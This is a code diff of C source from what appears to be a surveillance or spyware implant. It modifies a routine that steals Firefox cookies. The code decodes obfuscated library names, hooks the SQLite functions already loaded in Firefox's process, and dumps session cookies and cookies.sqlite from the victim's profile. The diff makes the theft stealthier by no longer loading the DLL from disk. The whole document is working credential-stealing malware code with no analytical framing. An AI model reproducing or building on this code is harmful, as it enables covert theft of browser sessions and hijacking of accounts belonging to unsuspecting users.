@@ -20,44 +20,30 @@ extern int DirectoryExists(WCHAR *path);
 extern char *HM_CompletePath(char *file_name, char *buffer);
 extern char *GetDosAsciiName(WCHAR *orig_path);
 extern WCHAR *GetFFProfilePath();
-extern WCHAR *GetFFLibPath();
 extern char *DeobStringA(char *string);
+extern void FireFoxInitFunc();
 
 #define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
 #define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"
 
 int static InitSocialLibs()
 {
-	char buffer[MAX_PATH];
-	WCHAR *firefoxDir;
-
-	firefoxDir = GetFFLibPath();
-	if (!firefoxDir || !DirectoryExists(firefoxDir)) 
-		return 0;
-
-	sprintf_s(buffer, MAX_PATH, "%S\\%s", firefoxDir, DeobStringA(SQLITEALT_LIBRARY_NAME));
-	if (!(libsqlsc = LoadLibrary(buffer))) {
-		sprintf_s(buffer, MAX_PATH, "%S\\%s", firefoxDir, DeobStringA(SQLITE_LIBRARY_NAME));
-		if (!(libsqlsc = LoadLibrary(buffer))) 
+	FireFoxInitFunc();
+	if (!(libsqlsc = GetModuleHandleA(DeobStringA(SQLITE_LIBRARY_NAME)))) 
+		if (!(libsqlsc = GetModuleHandleA(DeobStringA(SQLITEALT_LIBRARY_NAME))))
 			return 0;
-	}
 	
 	// sqlite functions
 	social_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlsc, "sqlite3_open");
 	social_SQLITE_close = (sqlite3_close) GetProcAddress(libsqlsc, "sqlite3_close");
 	social_SQLITE_exec = (sqlite3_exec) GetProcAddress(libsqlsc, "sqlite3_exec");
 
-	if (!social_SQLITE_open || !social_SQLITE_close || !social_SQLITE_exec) {
-		FreeLibrary(libsqlsc);
+	if (!social_SQLITE_open || !social_SQLITE_close || !social_SQLITE_exec) 
 		return 0;
-	}
+	
 	return 1;
 }
 
-void static UnInitSocialLibs()
-{
-	FreeLibrary(libsqlsc);
-}
 
 int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
 {
@@ -205,10 +191,8 @@ int DumpFFCookies(void)
 		
 	DumpSessionCookies(ProfilePath);
 
-	if (InitSocialLibs()) {	
+	if (InitSocialLibs()) 
 		DumpSqliteCookies(ProfilePath, L"cookies.sqlite"); 
-		UnInitSocialLibs();
-	}
 
 	return 0;
 }
